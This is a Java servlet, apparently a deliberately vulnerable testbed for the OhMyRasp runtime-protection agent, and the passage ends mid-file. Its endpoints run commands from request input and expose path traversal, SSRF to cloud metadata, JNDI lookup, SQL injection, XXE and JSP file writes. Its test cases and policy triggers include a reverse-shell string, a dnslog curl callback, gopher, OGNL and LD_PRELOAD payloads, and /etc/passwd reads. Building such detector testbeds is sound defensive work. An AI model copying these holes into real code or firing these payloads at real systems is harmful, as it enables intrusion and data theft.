package io.ohmyrasp.playground;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.DriverManager;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;

@WebServlet(name = "VulnerableServlet", urlPatterns = "/rasp/*")
public final class VulnerableServlet extends HttpServlet {
  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    response.setCharacterEncoding(StandardCharsets.UTF_8.name());
    response.setHeader("Access-Control-Allow-Origin", "*");
    response.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
    response.setHeader("Access-Control-Allow-Headers", "Content-Type, User-Agent");
    response.setContentType("text/plain");
    String action = request.getPathInfo() == null ? "/ui" : request.getPathInfo();
    boolean agentRequestEntered = false;
    try {
      if (!action.equals("/blocked")) {
        agentRequestEntered = enterAgentRequest(request, response);
      }
      String result =
          switch (action) {
            case "/", "/ui" -> renderUi(request);
            case "/blocked" -> renderBlocked(request);
            case "/cases" -> testCasesJson();
            case "/environments" -> environmentsJson();
            case "/labs" -> LabCatalog.json();
            case "/health" -> "ok";
            case "/request" -> "request inspected";
            case "/command" -> runCommand(request);
            case "/command/common" -> runCommandLiteral(List.of("echo", "bash -i >& /dev/tcp/127.0.0.1/4444"));
            case "/command/error" -> runCommandLiteral(List.of("sh", "-c", "echo 'unterminated"));
            case "/command/dnslog" -> runCommandLiteral(List.of("echo", "curl http://probe.dnslog.cn/a"));
            case "/command/reflect" -> runCommandReflect();
            case "/file/read" -> readFile(request);
            case "/file/read-sensitive" -> readFilePath(Path.of("/etc/passwd"));
            case "/file/read-outside" -> readFilePath(Path.of("/etc/hosts"));
            case "/file/write" -> writeFile(request);
            case "/file/write-reflect" -> writeFileReflect();
            case "/file/delete" -> deleteFile(request);
            case "/directory" -> listDirectory(request);
            case "/directory/root" -> listDirectoryPath("/root");
            case "/ssrf" -> outboundUrl(request);
            case "/dns" -> dnsLookup(request);
            case "/jndi" -> jndiLookup(request);
            case "/sql" -> sqlQuery(request);
            case "/deserialize" -> deserialize();
            case "/xxe" -> parseXxe(request);
            default -> {
              if (action.startsWith("/policy/")) {
                yield triggerPolicy(action.substring("/policy/".length()), request);
              }
              yield "unknown action: " + action;
            }
          };
      if (action.equals("/") || action.equals("/ui") || action.equals("/blocked")) {
        response.setContentType("text/html");
      } else if (action.equals("/cases") || action.equals("/environments") || action.equals("/labs")) {
        response.setContentType("application/json");
      }
      try (PrintWriter writer = response.getWriter()) {
        writer.println(result);
      }
    } catch (Exception e) {
      if (isOhMyRaspBlock(e)) {
        return;
      }
      response.setStatus(500);
      try (PrintWriter writer = response.getWriter()) {
        writer.println(e.getClass().getName() + ": " + e.getMessage());
      }
    } finally {
      if (agentRequestEntered) {
        exitAgentRequest();
      }
    }
  }

  @Override
  protected void doOptions(HttpServletRequest request, HttpServletResponse response) {
    response.setHeader("Access-Control-Allow-Origin", "*");
    response.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
    response.setHeader("Access-Control-Allow-Headers", "Content-Type, User-Agent");
    response.setStatus(204);
  }

  private static String runCommand(HttpServletRequest request) throws Exception {
    List<String> command = new ArrayList<>();
    command.add(value(request, "cmd", "sh"));
    String[] args = request.getParameterValues("arg");
    if (args != null) {
      command.addAll(List.of(args));
    }
    ProcessBuilder processBuilder = new ProcessBuilder(command).redirectErrorStream(true);
    hook(
        "beforeProcessBuilderStart",
        new Class<?>[] {ProcessBuilder.class, List.class},
        processBuilder,
        List.of());
    Process process = processBuilder.start();
    boolean finished = process.waitFor(2, TimeUnit.SECONDS);
    String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    return "finished=" + finished + " output=" + firstLine(output);
  }

  private static String runCommandLiteral(List<String> command) throws Exception {
    ProcessBuilder processBuilder = new ProcessBuilder(command).redirectErrorStream(true);
    hook(
        "beforeProcessBuilderStart",
        new Class<?>[] {ProcessBuilder.class, List.class},
        processBuilder,
        List.of());
    Process process = processBuilder.start();
    boolean finished = process.waitFor(2, TimeUnit.SECONDS);
    String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    return "finished=" + finished + " output=" + firstLine(output);
  }

  private static String runCommandReflect() throws Exception {
    ProcessBuilder processBuilder = new ProcessBuilder("id").redirectErrorStream(true);
    hook(
        "beforeProcessBuilderStart",
        new Class<?>[] {ProcessBuilder.class, List.class},
        processBuilder,
        List.of("java.lang.reflect.Method", "io.ohmyrasp.playground.VulnerableServlet"));
    Method start = ProcessBuilder.class.getMethod("start");
    Process process = (Process) start.invoke(processBuilder);
    boolean finished = process.waitFor(2, TimeUnit.SECONDS);
    String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    return "finished=" + finished + " output=" + firstLine(output);
  }

  private static String readFile(HttpServletRequest request) throws IOException {
    Path path = Path.of(value(request, "path", "/etc/passwd"));
    return readFilePath(path);
  }

  private static String readFilePath(Path path) throws IOException {
    try {
      hook("beforePathRead", new Class<?>[] {Object.class}, path);
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    return firstLine(Files.readString(path));
  }

  private static String writeFile(HttpServletRequest request) throws IOException {
    Path path = Path.of(value(request, "path", "/usr/local/tomcat/webapps/ROOT/uploaded.jsp"));
    try {
      hook("beforePathWrite", new Class<?>[] {Object.class, List.class}, path, List.of());
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    Files.createDirectories(path.getParent());
    Files.writeString(path, value(request, "content", "<% out.println(\"ohmyrasp\"); %>"));
    return "wrote " + path;
  }

  private static String writeFileReflect() throws Exception {
    String path = "/usr/local/tomcat/webapps/ROOT/reflect.jsp";
    hook(
        "beforeFileWrite",
        new Class<?>[] {String.class, List.class},
        path,
        List.of("java.lang.reflect.Method", "io.ohmyrasp.playground.VulnerableServlet"));
    Constructor<FileOutputStream> constructor = FileOutputStream.class.getConstructor(String.class);
    try (OutputStream output = constructor.newInstance(path)) {
      output.write("<% out.println(\"reflect\"); %>".getBytes(StandardCharsets.UTF_8));
    }
    return "wrote " + path;
  }

  private static String deleteFile(HttpServletRequest request) throws IOException {
    Path path = Path.of(value(request, "path", "/tmp/ohmyrasp-delete-target.txt"));
    if (Boolean.parseBoolean(value(request, "touch", "true"))) {
      Files.writeString(path, "delete target");
    }
    try {
      hook("beforePathDelete", new Class<?>[] {Object.class}, path);
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    return "deleted=" + path.toFile().delete();
  }

  private static String listDirectory(HttpServletRequest request) {
    return listDirectoryPath(value(request, "path", "/etc"));
  }

  private static String listDirectoryPath(String path) {
    try {
      hook("beforeDirectoryList", new Class<?>[] {Object.class, List.class}, path, List.of());
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    File[] files = new File(path).listFiles();
    return "entries=" + (files == null ? 0 : files.length);
  }

  private static String outboundUrl(HttpServletRequest request) throws IOException {
    URL url = URI.create(value(request, "url", "http://169.254.169.254/latest/meta-data/")).toURL();
    try {
      hook("beforeUrlOpen", new Class<?>[] {Object.class}, url);
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    var connection = url.openConnection();
    connection.setConnectTimeout(200);
    connection.setReadTimeout(200);
    try (var stream = connection.getInputStream()) {
      return firstLine(new String(stream.readNBytes(80), StandardCharsets.UTF_8));
    } catch (IOException e) {
      return "open failed after hook: " + e.getClass().getSimpleName();
    }
  }

  private static String dnsLookup(HttpServletRequest request) throws IOException {
    String host = value(request, "host", "probe.dnslog.cn");
    try {
      hook("beforeDnsLookup", new Class<?>[] {String.class}, host);
    } catch (Exception e) {
      if (isOhMyRaspBlock(e) && e instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
    }
    InetAddress[] addresses = InetAddress.getAllByName(host);
    return "addresses=" + addresses.length;
  }

  private static String jndiLookup(HttpServletRequest request) throws Exception {
    String name = value(request, "name", "ldap://127.0.0.1:1389/a");
    hook("beforeJndiLookup", new Class<?>[] {Object.class}, name);
    Hashtable<String, String> env = new Hashtable<>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
    env.put("com.sun.jndi.ldap.connect.timeout", "200");
    env.put("com.sun.jndi.ldap.read.timeout", "200");
    try {
      new InitialContext(env).lookup(name);
      return "lookup completed";
    } catch (Exception e) {
      return "lookup failed after hook: " + e.getClass().getSimpleName();
    }
  }

  private static String sqlQuery(HttpServletRequest request) throws Exception {
    String value = value(request, "value", "' OR '1'='1");
    Class.forName("org.h2.Driver");
    try (var connection = DriverManager.getConnection("jdbc:h2:mem:ohmyrasp;DB_CLOSE_DELAY=-1");
        var statement = connection.createStatement()) {
      statement.execute("create table if not exists users(id int primary key, name varchar(80))");
      statement.execute("merge into users key(id) values(1, 'alice')");
      String query = "select * from users where name = '" + value + "'";
      hook("beforeSql", new Class<?>[] {String.class}, query);
      try (var resultSet = statement.executeQuery(query)) {
        int count = 0;
        while (resultSet.next()) {
          count++;
        }
        return "rows=" + count;
      }
    }
  }

  private static String deserialize() throws Exception {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    try (ObjectOutputStream output = new ObjectOutputStream(bytes)) {
      output.writeObject(new EvilSerialized("poc"));
    }
    try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(bytes.toByteArray()))) {
      Object value = input.readObject();
      return "deserialized=" + value.getClass().getName();
    }
  }

  private static String parseXxe(HttpServletRequest request) throws Exception {
    String entity = value(request, "entity", "file:///etc/passwd");
    String xml = "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"" + entity + "\">]><root>&xxe;</root>";
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setExpandEntityReferences(true);
    factory.setXIncludeAware(false);
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", true);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "all");
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "all");
    String text =
        factory
            .newDocumentBuilder()
            .parse(new InputSource(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8))))
            .getDocumentElement()
            .getTextContent();
    return firstLine(text);
  }

  private static String triggerPolicy(String policy, HttpServletRequest request) throws Exception {
    switch (policy) {
      case "sql-exception" ->
          hook(
              "beforeSqlException",
              new Class<?>[] {String.class, String.class, String.class, String.class, String.class},
              "mysql",
              "1064",
              "",
              "You have an error in your SQL syntax",
              "select * from where");
      case "sql-policy" ->
          hook(
              "beforeSql",
              new Class<?>[] {String.class},
              "select 1 union select password from users");
      case "sql-regex" ->
          hook(
              "beforeSqlRegex",
              new Class<?>[] {String.class, String.class},
              "select table_name from information_schema.tables",
              "information_schema");
      case "request-scanner" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/rasp/request",
              "",
              Map.of(),
              Map.of("user-agent", "sqlmap/1.7"));
      case "request-unusual" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/rasp/request",
              "",
              Map.of(),
              Map.of());
      case "ssrf-userinput" ->
          hook(
              "beforeUrlOpen",
              new Class<?>[] {Object.class},
              value(request, "url", "http://127.0.0.1/admin"));
      case "ssrf-common" ->
          hook("beforeUrlOpen", new Class<?>[] {Object.class}, "http://probe.dnslog.cn/a");
      case "ssrf-protocol" ->
          hook("beforeUrlOpen", new Class<?>[] {Object.class}, "gopher://127.0.0.1:6379/_info");
      case "ssrf-obfuscate" ->
          hook("beforeUrlOpen", new Class<?>[] {Object.class}, "http://2130706433/");
      case "read-http" ->
          hook(
              "beforeFileRead",
              new Class<?>[] {String.class},
              value(request, "file", "http://127.0.0.1/internal"));
      case "read-unwanted" ->
          hook(
              "beforeFileRead",
              new Class<?>[] {String.class},
              value(request, "file", "file:///etc/passwd"));
      case "write-ntfs" ->
          hook("beforeFileWrite", new Class<?>[] {String.class}, "upload.txt::$DATA");
      case "include-userinput" ->
          hook(
              "beforeInclude",
              new Class<?>[] {String.class, String.class, String.class},
              value(request, "file", "/etc/passwd"),
              value(request, "file", "/etc/passwd"),
              "include");
      case "include-protocol" ->
          hook(
              "beforeInclude",
              new Class<?>[] {String.class, String.class, String.class},
              "jar://file:/tmp/a.jar!/x",
              "",
              "include");
      case "directory-reflect" ->
          hook("beforeDirectoryList", new Class<?>[] {Object.class}, "/tmp");
      case "xxe-protocol" ->
          hook(
              "beforeXmlEntity",
              new Class<?>[] {String.class, Object.class},
              "xxe",
              "http://example.com/evil.dtd");
      case "xxe-file" ->
          hook("beforeXxeFileRead", new Class<?>[] {String.class}, "/etc/passwd");
      case "upload-script" ->
          hook("beforeFileUpload", new Class<?>[] {String.class}, "shell.jsp");
      case "upload-html" ->
          hook("beforeFileUpload", new Class<?>[] {String.class}, "phish.html");
      case "upload-exe" ->
          hook("beforeFileUpload", new Class<?>[] {String.class}, "dropper.exe");
      case "webdav" ->
          hook(
              "beforeWebdavUpload",
              new Class<?>[] {String.class, String.class, String.class},
              "avatar.jpg",
              "shell.jsp",
              "MOVE");
      case "rename" ->
          hook("beforeRename", new Class<?>[] {String.class, String.class}, "avatar.jpg", "shell.jsp");
      case "link" ->
          hook(
              "beforeLink",
              new Class<?>[] {String.class, String.class, String.class},
              "avatar.jpg",
              "shell.jsp",
              "hard");
      case "ognl" ->
          hook(
              "beforeOgnl",
              new Class<?>[] {String.class},
              "@java.lang.Runtime@getRuntime().exec('id')");
      case "ognl-length" ->
          hook("beforeOgnl", new Class<?>[] {String.class}, "a".repeat(401));
      case "eval" ->
          hook("beforeEval", new Class<?>[] {String.class, String.class}, "eval", "base64_decode($x)");
      case "loadlib" ->
          hook(
              "beforeLoadLibrary",
              new Class<?>[] {String.class, String.class, boolean.class},
              "System.load",
              "\\\\server\\share\\evil.dll",
              true);
      case "response" ->
          hook(
              "beforeResponseDataLeak",
              new Class<?>[] {String.class, String.class},
              "application/json",
              "{\"phone\":\"13800138000\"}");
      case "xss-echo" ->
          hook(
              "beforeXssEcho",
              new Class<?>[] {String.class},
              "hello " + value(request, "q", "<script>alert(1)</script>"));
      case "webshell-eval" ->
          hook(
              "beforeWebshellEval",
              new Class<?>[] {String.class, String.class},
              "assert",
              value(request, "code", "system('id')"));
      case "webshell-command" ->
          hook(
              "beforeWebshellCommand",
              new Class<?>[] {String.class},
              value(request, "cmd", "sh -c id"));
      case "webshell-file" ->
          hook(
              "beforeWebshellFileWrite",
              new Class<?>[] {String.class, String.class},
              value(request, "file", "shell.jsp"),
              value(request, "content", "<% out.println(1); %>"));
      case "webshell-callable" ->
          hook("beforeWebshellCallable", new Class<?>[] {String.class}, "system");
      case "webshell-ld" ->
          hook(
              "beforeWebshellLdPreload",
              new Class<?>[] {String.class, String.class},
              "LD_PRELOAD",
              "/tmp/evil.so");
      default -> throw new IllegalArgumentException("unknown policy: " + policy);
    }
    return "policy " + policy + " triggered";
  }

  private static void hook(String name, Class<?>[] parameterTypes, Object... args) throws Exception {
    try {
      Class<?> hooks = Class.forName("io.ohmyrasp.agent.hook.OhMyRaspHooks");
      hooks.getMethod(name, parameterTypes).invoke(null, args);
    } catch (ClassNotFoundException noAgent) {
      return;
    } catch (InvocationTargetException e) {
      Throwable cause = e.getCause();
      if (isOhMyRaspBlock(cause) && cause instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
      if (cause instanceof Exception exception) {
        throw exception;
      }
      if (cause instanceof Error error) {
        throw error;
      }
      throw e;
    }
  }

  private static boolean enterAgentRequest(HttpServletRequest request, HttpServletResponse response)
      throws Exception {
    try {
      Class<?> hooks = Class.forName("io.ohmyrasp.agent.hook.OhMyRaspHooks");
      hooks
          .getMethod("enterHttpRequest", Object.class, Object.class)
          .invoke(null, request, response);
      return true;
    } catch (ClassNotFoundException noAgent) {
      return false;
    } catch (InvocationTargetException e) {
      Throwable cause = e.getCause();
      if (isOhMyRaspBlock(cause) && cause instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
      if (cause instanceof Exception exception) {
        throw exception;
      }
      if (cause instanceof Error error) {
        throw error;
      }
      throw e;
    }
  }

  private static void exitAgentRequest() {
    try {
      hook("exitHttpRequest", new Class<?>[] {});
    } catch (Exception ignored) {
      // Request teardown should never mask the playground response.
    }
  }

  private static boolean isOhMyRaspBlock(Throwable throwable) {
    Throwable current = throwable;
    while (current != null) {
      if (current.getClass().getName().equals("io.ohmyrasp.agent.hook.OhMyRaspBlockException")) {
        return true;
      }
      current = current.getCause();
    }
    return false;
  }

  private static String renderBlocked(HttpServletRequest request) {
    return """
        <!doctype html>
        <html lang="en">
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>OhMyRasp Intercepted</title>
          <style>
            body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#111827;color:#f9fafb}
            main{max-width:860px;margin:0 auto;padding:48px 24px}
            .panel{border:1px solid #374151;background:#1f2937;border-radius:8px;padding:24px}
            h1{margin:0 0 12px;font-size:28px;letter-spacing:0}
            dl{display:grid;grid-template-columns:120px 1fr;gap:10px 16px;margin:24px 0 0}
            dt{color:#9ca3af}dd{margin:0;overflow-wrap:anywhere}
            a{color:#93c5fd}
          </style>
        </head>
        <body>
          <main>
            <section class="panel">
              <h1>Request intercepted</h1>
              <p>OhMyRasp redirected this request after a detector matched.</p>
              <dl>
                <dt>Hook</dt><dd>%s</dd>
                <dt>Algorithm</dt><dd>%s</dd>
                <dt>Message</dt><dd>%s</dd>
              </dl>
              <p><a href="/rasp/ui">Back to testbed</a></p>
            </section>
          </main>
        </body>
        </html>
        """
        .formatted(
            html(value(request, "hook", "")),
            html(value(request, "algorithm", "")),
            html(value(request, "message", "")));
  }

  private static String renderUi(HttpServletRequest request) {
    return """
        <!doctype html>
        <html lang="en">
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>OhMyRasp Testbed</title>
          <style>
            :root{color-scheme:light;--ink:#172033;--muted:#5d667a;--line:#d8dde8;--bg:#f5f7fb;--panel:#fff;--base:#2563eb;--prot:#b42318;--accent:#6d28d9}
            *{box-sizing:border-box}body{margin:0;font-family:Arial,Helvetica,sans-serif;background:var(--bg);color:var(--ink)}
            header{background:#0f172a;color:#fff;padding:18px 24px;border-bottom:4px solid #2dd4bf}
            header h1{margin:0;font-size:24px;letter-spacing:0}header p{margin:6px 0 0;color:#cbd5e1}
            main{padding:18px 24px;max-width:1440px;margin:0 auto}
            .toolbar{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-bottom:16px}
            .toolbar code,.toolbar select{background:#e8edf6;border:1px solid var(--line);border-radius:6px;padding:7px 9px}
            .grid{display:grid;grid-template-columns:minmax(520px,1.1fr) minmax(420px,.9fr);gap:16px}
            table{width:100%%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden}
            th,td{border-bottom:1px solid var(--line);padding:10px;text-align:left;vertical-align:middle;font-size:14px}
            th{background:#eef2f8;color:#334155;font-size:12px;text-transform:uppercase;letter-spacing:.04em}
            tr:last-child td{border-bottom:0}.category{color:var(--muted);font-size:12px}
            button{border:1px solid transparent;border-radius:6px;padding:8px 10px;color:#fff;cursor:pointer;min-width:96px}
            button.base{background:var(--base)}button.protected{background:var(--prot)}button.all{background:#0f766e}button.env{background:var(--accent)}
            button:disabled{opacity:.5;cursor:wait}
            .labs{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin:0 0 16px}
            .lab{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px}
            .lab h2{font-size:15px;margin:0 0 6px}.lab p{font-size:13px;color:var(--muted);margin:0 0 8px}.lab code{font-size:12px}
            .result{background:var(--panel);border:1px solid var(--line);border-radius:8px;min-height:520px;padding:14px}
            .result h2{margin:0 0 12px;font-size:18px}.entry{border-top:1px solid var(--line);padding:10px 0}
            .entry:first-of-type{border-top:0}.tag{display:inline-block;border-radius:999px;padding:2px 8px;font-size:12px;color:#fff}
            .tag.baseline{background:var(--base)}.tag.protected{background:var(--prot)}
            pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#0b1220;color:#d1e7ff;border-radius:6px;padding:10px;max-height:160px;overflow:auto}
            @media(max-width:980px){.grid{grid-template-columns:1fr}main{padding:14px}th:nth-child(2),td:nth-child(2){display:none}}
          </style>
        </head>
        <body>
          <header>
            <h1>OhMyRasp Comparative Testbed</h1>
            <p>Tomcat 9, 10, and 11 run as paired baseline and protected environments.</p>
          </header>
          <main>
            <div class="toolbar">
              <select id="environmentSelect"></select>
              <code id="environmentUrl"></code>
              <button class="env" id="runSelected">Run selected environment</button>
              <button class="base" id="runBaselines">Run all baselines</button>
              <button class="all" id="runProtected">Run all protected</button>
            </div>
            <section class="labs" id="labs"></section>
            <div class="grid">
              <table>
                <thead><tr><th>Case</th><th>Endpoint</th><th>Run</th></tr></thead>
                <tbody id="cases"></tbody>
              </table>
              <section class="result">
                <h2>Results</h2>
                <div id="results"></div>
              </section>
            </div>
          </main>
          <script>
            const cases = %s;
            const environments = %s;
            const labCatalog = %s;
            const host = location.hostname || 'localhost';
            for (const env of environments) {
              env.base = `${location.protocol}//${host}:${env.port}`;
              const option = document.createElement('option');
              option.value = env.id;
              option.textContent = env.label;
              environmentSelect.appendChild(option);
            }
            function selectedEnvironment() {
              return environments.find(env => env.id === environmentSelect.value) || environments[0];
            }
            function updateEnvironmentUrl() {
              const env = selectedEnvironment();
              environmentUrl.textContent = `${env.kind}: ${env.base}`;
            }
            environmentSelect.onchange = updateEnvironmentUrl;
            updateEnvironmentUrl();
            const labsContainer = document.getElementById('labs');
            for (const group of labCatalog.groups || []) {
              const article = document.createElement('article');
              article.className = 'lab';
              article.innerHTML = `<h2>${escapeHtml(group.label)}</h2><p>${escapeHtml((group.mechanics || []).join(' / '))}</p><code>${(group.labs || []).map(lab => escapeHtml(lab.name)).join(', ')}</code>`;
              labsContainer.appendChild(article);
            }
            const tbody = document.getElementById('cases');
            for (const item of cases) {
              const tr = document.createElement('tr');
              tr.innerHTML = `<td><strong>${item.name}</strong><div class="category">${item.category}</div></td><td><code>${item.path}</code></td><td><button class="env">Run selected</button></td>`;
              tr.querySelector('.env').onclick = () => runCase(item, selectedEnvironment());
              tbody.appendChild(tr);
            }
            runSelected.onclick = () => runSet([selectedEnvironment()], runSelected);
            runBaselines.onclick = () => runSet(environments.filter(env => env.kind === 'baseline'), runBaselines);
            runProtected.onclick = () => runSet(environments.filter(env => env.kind === 'protected'), runProtected);
            async function runSet(selected, button) {
              button.disabled = true;
              for (const env of selected) {
                for (const item of cases) await runCase(item, env);
              }
              button.disabled = false;
            }
            async function runCase(item, env) {
              const started = performance.now();
              let status = 'error', finalUrl = '', body = '';
              try {
                const response = await fetch(env.base + item.path, {redirect:'follow'});
                status = String(response.status);
                finalUrl = response.url;
                body = await response.text();
              } catch (error) {
                body = String(error);
              }
              const elapsed = Math.round(performance.now() - started);
              const entry = document.createElement('div');
              entry.className = 'entry';
              entry.innerHTML = `<span class="tag ${env.kind}">${env.label}</span> <strong>${item.name}</strong> <span>${status} / ${elapsed}ms</span><div><small>${finalUrl}</small></div><pre>${escapeHtml(body.slice(0, 1200))}</pre>`;
              results.prepend(entry);
            }
            function escapeHtml(value) {
              return value.replace(/[&<>"']/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[ch]));
            }
          </script>
        </body>
        </html>
        """
        .formatted(testCasesJson(), environmentsJson(), LabCatalog.json());
  }

  private static String testCasesJson() {
    return """
        [
          {"category":"request","name":"Scanner user agent","path":"/rasp/policy/request-scanner"},
          {"category":"request","name":"Missing User-Agent","path":"/rasp/policy/request-unusual"},
          {"category":"request","name":"XSS parameter","path":"/rasp/request?q=%3Cscript%3Ealert(1)%3C/script%3E"},

          {"category":"command","name":"Command user input","path":"/rasp/command?cmd=sh&arg=-c&arg=cat%20/etc/passwd%3B%20id"},
          {"category":"command","name":"Command common payload","path":"/rasp/command/common"},
          {"category":"command","name":"Command syntax error","path":"/rasp/command/error"},
          {"category":"command","name":"Command DNS callback payload","path":"/rasp/command/dnslog"},
          {"category":"command","name":"Reflective command execution","path":"/rasp/command/reflect"},

          {"category":"file","name":"Sensitive file read","path":"/rasp/file/read?path=/etc/passwd"},
          {"category":"file","name":"Hardcoded sensitive file read","path":"/rasp/file/read-sensitive"},
          {"category":"file","name":"Read outside application","path":"/rasp/file/read-outside"},
          {"category":"file","name":"Script file write","path":"/rasp/file/write?path=/usr/local/tomcat/webapps/ROOT/shell.jsp"},
          {"category":"file","name":"Reflective script file write","path":"/rasp/file/write-reflect"},
          {"category":"file","name":"File delete","path":"/rasp/file/delete?path=/tmp/ohmyrasp-delete-target.txt"},

          {"category":"directory","name":"Directory listing","path":"/rasp/directory?path=/etc"},
          {"category":"directory","name":"Root directory listing","path":"/rasp/directory/root"},
          {"category":"directory","name":"Reflective directory listing policy","path":"/rasp/policy/directory-reflect"},

          {"category":"network","name":"SSRF metadata","path":"/rasp/ssrf?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"},
          {"category":"network","name":"DNS callback","path":"/rasp/dns?host=probe.dnslog.cn"},
          {"category":"network","name":"SSRF user input policy","path":"/rasp/policy/ssrf-userinput?url=http%3A%2F%2F127.0.0.1%2Fadmin"},
          {"category":"network","name":"SSRF common callback policy","path":"/rasp/policy/ssrf-common"},
          {"category":"network","name":"SSRF protocol policy","path":"/rasp/policy/ssrf-protocol"},
          {"category":"network","name":"SSRF obfuscated localhost policy","path":"/rasp/policy/ssrf-obfuscate"},

          {"category":"jndi","name":"JNDI LDAP lookup","path":"/rasp/jndi?name=ldap%3A%2F%2F127.0.0.1%3A1389%2Fa"},

          {"category":"sql","name":"SQL injection","path":"/rasp/sql?value=%27%20OR%20%271%27%3D%271"},
          {"category":"sql","name":"SQL exception policy","path":"/rasp/policy/sql-exception"},
          {"category":"sql","name":"SQL policy rule","path":"/rasp/policy/sql-policy"},
          {"category":"sql","name":"SQL regex policy","path":"/rasp/policy/sql-regex"},

          {"category":"java","name":"Deserialization","path":"/rasp/deserialize"},

          {"category":"xml","name":"XXE file entity","path":"/rasp/xxe?entity=file%3A%2F%2F%2Fetc%2Fpasswd"},
          {"category":"xml","name":"XXE protocol policy","path":"/rasp/policy/xxe-protocol"},
          {"category":"xml","name":"XXE file detector","path":"/rasp/policy/xxe-file"},

          {"category":"read","name":"Remote file read policy","path":"/rasp/policy/read-http?file=http%3A%2F%2F127.0.0.1%2Finternal"},
          {"category":"read","name":"Unwanted file read policy","path":"/rasp/policy/read-unwanted?file=file%3A%2F%2F%2Fetc%2Fpasswd"},

          {"category":"include","name":"Include user input policy","path":"/rasp/policy/include-userinput?file=/etc/passwd"},
          {"category":"include","name":"Include protocol policy","path":"/rasp/policy/include-protocol"},

          {"category":"upload","name":"Multipart script upload","path":"/rasp/policy/upload-script"},
          {"category":"upload","name":"Multipart HTML upload","path":"/rasp/policy/upload-html"},
          {"category":"upload","name":"Executable upload","path":"/rasp/policy/upload-exe"},
          {"category":"upload","name":"WebDAV upload rename","path":"/rasp/policy/webdav"},
          {"category":"upload","name":"Dangerous rename","path":"/rasp/policy/rename"},
          {"category":"upload","name":"Dangerous hard link","path":"/rasp/policy/link"},

          {"category":"expression","name":"OGNL blacklist","path":"/rasp/policy/ognl"},
          {"category":"expression","name":"OGNL length limit","path":"/rasp/policy/ognl-length"},
          {"category":"expression","name":"Dynamic eval policy","path":"/rasp/policy/eval"},

          {"category":"native","name":"Native library load policy","path":"/rasp/policy/loadlib"},

          {"category":"response","name":"Response PII leak","path":"/rasp/policy/response"},
          {"category":"response","name":"Reflected XSS response","path":"/rasp/policy/xss-echo?q=%3Cscript%3Ealert(1)%3C/script%3E"},

          {"category":"webshell","name":"Webshell eval","path":"/rasp/policy/webshell-eval?code=system('id')"},
          {"category":"webshell","name":"Webshell command","path":"/rasp/policy/webshell-command?cmd=sh%20-c%20id"},
          {"category":"webshell","name":"Webshell file write","path":"/rasp/policy/webshell-file?file=shell.jsp&content=%3C%25%20out.println(1)%3B%20%25%3E"},
          {"category":"webshell","name":"Webshell callable","path":"/rasp/policy/webshell-callable"},
          {"category":"webshell","name":"Webshell LD_PRELOAD","path":"/rasp/policy/webshell-ld"}
        ]
        """;
  }

  private static String environmentsJson() {
    return """
        [
